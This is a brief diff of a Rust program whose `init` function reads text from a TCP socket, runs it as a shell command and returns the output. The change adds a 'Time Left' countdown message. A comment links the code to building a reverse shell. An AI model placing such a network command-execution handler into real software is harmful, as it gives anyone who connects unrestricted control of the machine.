@@ -30,7 +30,7 @@ fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
     Ok(result.stdout.into_boxed_slice())
 }
 
-pub async fn init(mut socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
+pub async fn init(mut socket: TcpStream, time_left: usize) -> Result<Box<[u8]>, Box<dyn Error>> {
     // on run... do this:
     /*
      * 1. Detect what shells are on the machine
@@ -42,6 +42,8 @@ pub async fn init(mut socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
 
     //tokio can be used to spawn a server to create a reverse shell.
     let mut buffer = vec![];
+    let time_left_msg = format!("Time Left: {time_left} seconds\n");
+    socket.write_all(time_left_msg.as_bytes()).await?;
     _ = socket.read_to_end(&mut buffer).await;
     let input = String::from_utf8(buffer)?;
     let response = shell(input.trim())?;
